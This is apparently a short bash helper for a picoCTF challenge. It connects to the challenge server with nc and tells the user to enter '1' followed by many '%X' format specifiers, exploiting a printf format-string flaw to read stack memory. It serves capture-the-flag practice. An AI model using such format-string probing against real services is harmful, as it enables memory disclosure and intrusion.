#!/bin/bash

# printf vulnerability, so we can walk up the stack with %X!!!

echo "Type in 1";
echo "Then type in loooots of %X in a row !!!";

nc mercury.picoctf.net 27912

